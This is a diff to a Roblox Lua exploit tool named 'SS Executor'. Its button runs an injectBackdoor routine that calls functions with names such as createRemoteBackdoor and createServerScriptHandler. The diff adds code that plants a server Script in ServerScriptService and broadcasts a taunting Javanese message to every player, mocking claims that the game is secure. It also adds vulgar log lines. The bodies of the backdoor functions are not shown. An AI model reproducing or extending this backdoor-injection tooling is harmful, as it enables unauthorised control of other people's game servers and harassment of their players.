@@ -105,8 +105,8 @@ local totalCount = 0
 local testResults = {}
 
 StarterGui:SetCore("SendNotification", {
-    Title = "SS Executor",
-    Text = "SSExec | Inject for connecting from client to server.",
+    Title = "SS Executor | Jawa",
+    Text = "SSExec | Inject to connect to the server mas.",
     Duration = 10
 })
 
@@ -117,6 +117,45 @@ end
 
 local function updatePhase(phaseNumber)
     phaseLabel.Text = "SERVICES: " .. phaseNumber
+end
+
+local function createHintRemote()
+    local hintRemote = game.ReplicatedStorage:FindFirstChild("HintRemote")
+    if not hintRemote then
+        hintRemote = Instance.new("RemoteEvent")
+        hintRemote.Name = "HintRemote"
+        hintRemote.Parent = game.ReplicatedStorage
+        print("HintRemote created.")
+    else
+        print("HintRemote already exists.")
+    end
+    return hintRemote
+end
+
+local function serverHint()
+    -- Ensure the RemoteEvent exists
+    local hintRemote = createHintRemote()
+    local serverHintScript = Instance.new("Script")
+    serverHintScript.Name = "ServerHintScript"
+    serverHintScript.Source = [[
+        local hintRemote = game.ReplicatedStorage:WaitForChild("HintRemote")
+        
+        local function sendHint(message)
+            hintRemote:FireAllClients(message)
+        end
+        
+        sendHint("Iki lho mas, sing ngandika game aman wkwk | SSExec")
+    ]]
+    
+    local serverScriptService = game:FindFirstChild("ServerScriptService")
+    if not serverScriptService then
+        serverScriptService = Instance.new("Folder")
+        serverScriptService.Name = "ServerScriptService"
+        serverScriptService.Parent = game
+    end
+    serverHintScript.Parent = serverScriptService
+
+    print("ServerHintScript created in ServerScriptService bitch")
 end
 
 local function createRemoteBackdoor()
@@ -428,24 +467,31 @@ local function hintServer(message)
 end
 
 local isInjected = false
+local isHint = false
 
 local function injectBackdoor()
     if isInjected then
+        if isHint then
+            print("?server: hint.already.created")
+            return
+        end
         updateNotification("Already Injected")
         return
     end
+    
     -- // Call SSExec Func
     createRemoteBackdoor()
     createRemoteEvent()
     createScriptHandler()
     createGUIHandler()
     createServerScriptHandler()
-
-    hintServer("SSExec | Jawa, ")
     
     isInjected = true
+    isHint = true
     ssTest()
+    serverHint()
 end
 
 executeButton.MouseButton1Click:Connect(executeScript)
 injectButton.MouseButton1Click:Connect(injectBackdoor)
+-- // Ngawuor wkwk
